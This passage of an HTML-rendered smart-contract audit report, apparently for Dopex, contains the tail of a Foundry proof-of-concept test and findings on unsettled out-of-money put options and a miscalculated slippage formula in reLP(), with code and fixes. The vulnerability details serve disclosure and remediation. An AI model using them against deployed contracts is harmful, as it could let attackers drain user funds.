rdpxUserPart2) = vaultLp.redeemPreview(userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;WETH: &quot;, wethUserPart2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;rdpx: &quot;, rdpxUserPart2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // We assert that the user still gets the same amount of rdpx regardless of the price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(rdpxUser, rdpxUserPart2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // We change the `_rdpxCollateral`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mintRdpx(10 ether, address(vault));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(vault));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    rdpx.transfer(address(vaultLp), 10 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultLp.addRdpx(10 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Now we test that the amount of `rdpx` returned changes in response to more underlying `rdpx` received</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Deposit swap from WETH to RDPX - Part 3&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    priceOracle.updateRdpxPrice(0.020 gwei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;Current rdpxPriceInEth: &quot;, vault.getUnderlyingPrice());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;User gets:&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 wethUserPart3, uint256 rdpxUserPart3) = vaultLp.redeemPreview(userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;WETH: &quot;, wethUserPart3);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;rdpx: &quot;, rdpxUserPart3);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // We assert that we will receive more `rdpx` for the same amount of `WETH`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertGt(rdpxUserPart3, rdpxUserPart2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    assertEq(wethUserPart3, wethUserPart2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n</details>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When calling <code>redeem</code>, calculate the amount of <code>rdpx</code> the depositor should receive using up-to-date <code>rdpxPriceInEth</code>.</p>\n<p>Consider disallowing immediate <code>deposit</code> and <code>redeem</code> calls through some mechanism.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2130#issuecomment-1734336355\">psytama (Dopex) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-03-no-mechanism-to-settle-out-of-money-put-options-even-after-bond-receipt-token-is-redeemed-\" style=\"position:relative;\"><a href=\"#m-03-no-mechanism-to-settle-out-of-money-put-options-even-after-bond-receipt-token-is-redeemed-\" aria-label=\"m 03 no mechanism to settle out of money put options even after bond receipt token is redeemed  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1956\">[M-03] No mechanism to settle out-of-money put options even after Bond receipt token is redeemed. </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1956\">0Kage</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1479\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1100\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1068\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/625\">0xnev</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/419\">zzebra83</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L333\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L333</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L800\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L800</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L376\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L376</a></p>\n<p>In the current implementation of <code>PerpetualAtlanticVault::settle</code>, the only way an <code>optionId</code> can be burnt is when the option is in-the-money. Note that at the time of bonding, a put option that is 25% out of the money is purchased by user. If the RDPX-ETH price is above this price, the option is rolled over to the next epoch and a new premium is again calculated inside the <code>PerpetualAtlanticVault::calculateFunding</code> and added to the <code>totalFundingForEpoch</code>.</p>\n<p>Effectively, as long as the option is out of money, the funding cost continues to be deducted from core contract and passed to Atlantic vault LPs.  There is no check if the underlying bond for which this put option is minted is redeemed or not.</p>\n<p>Not completely sure if this is bug or feature of Perpetual Atlantic Puts but since the utility of these puts is to protect downside price movements of RDPX during bonding, such options should be retired once the underlying bond is redeemed by user. Paying out a premium on a perennial basis to Atlantic LP’s does not make sense.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>There are 2 implications:</p>\n<ol>\n<li>Atlantic vault LPs collateral will be locked so long as option is out of money. This is because <code>optionStrikes[strike]</code> never reduces so long as the option continues to be OTM.</li>\n<li>Core contract continues to pay out funding costs for OTM options that cannot be settled.</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider settling <code>optionIds</code> that no longer have an underlying bonding. Put options for such bonds should expire and free up locked collateral in Atlantic Vaults.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1956#issuecomment-1734300784\">psytama (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-04-relp-mintokenaamount-the-calculations-are-wrong\" style=\"position:relative;\"><a href=\"#m-04-relp-mintokenaamount-the-calculations-are-wrong\" aria-label=\"m 04 relp mintokenaamount the calculations are wrong permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1805\">[M-04] reLP() mintokenAAmount the calculations are wrong</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1805\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2097\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1847\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1405\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1400\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1371\">flacko</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1287\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1238\">ether_sky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1231\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1117\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1093\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1046\">gjaldon</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1014\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/965\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/916\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/813\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/451\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/285\">Yanchuan</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/135\">deadrxsezzz</a></em></p>\n<p>in <code>reLP()</code> , Calculating <code>mintokenAAmount</code> using the wrong formula can invalidate the slippage protection</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>ReLPContract.reLP()</code>The implementation is as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reLP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;  </span><span class=\"mtk12\">mintokenAAmount</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;    (((</span><span class=\"mtk12\">amountB</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@&gt;    (((</span><span class=\"mtk12\">amountB</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAPrice</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">slippageTolerance</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAAmountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV2Router</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">swapExactTokensForTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amountB</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">mintokenAAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">path</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )[</span><span class=\"mtk12\">path</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lp</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IUniswapV2Router</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammRouter</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenB</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAAmountOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">amountB</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer the lp to the amo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IUniV2LiquidityAmo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">).</span><span class=\"mtk11\">sync</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer rdpx to rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IRdpxV2Core</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">).</span><span class=\"mtk11\">sync</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The formula for calculating <code>mintokenAAmount</code> in the above code is\n<code>((amountB / 2) * tokenAInfo.tokenAPrice) / 1e8</code></p>\n<p><code>amountB</code> is the amount of tokenB, but <code>tokenAInfo.tokenAPrice</code> is the price of tokenA, which shouldn’t be multiplied together</p>\n<p>The correct one should be</p>\n<p><code>((amountB / 2) * 1e8 / tokenAInfo.tokenAPrice)</code></p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function reLP(uint256 _amount) external onlyRole(RDPXV2CORE_ROLE) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    mintokenAAmount =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     (((amountB / 2) * tokenAInfo.tokenAPrice) / 1e8) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-     (((amountB / 2) * tokenAInfo.tokenAPrice * slippageTolerance) / 1e16);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    mintokenAAmount =  ((amountB / 2) * 1e8 / tokenAInfo.tokenAPrice) * (1e8 - slippageTolerance) / 1e8;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 tokenAAmountOut = IUniswapV2Router(addresses.ammRouter)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .swapExactTokensForTokens(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        amountB / 2,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        mintokenAAmount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        path,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        block.timestamp + 10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      )[path.length - 1];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, , uint256 lp) = IUniswapV2Router(addresses.ammRouter).addLiquidity(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      addresses.tokenA,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      addresses.tokenB,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      tokenAAmountOut,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      amountB / 2,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      block.timestamp + 10</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span 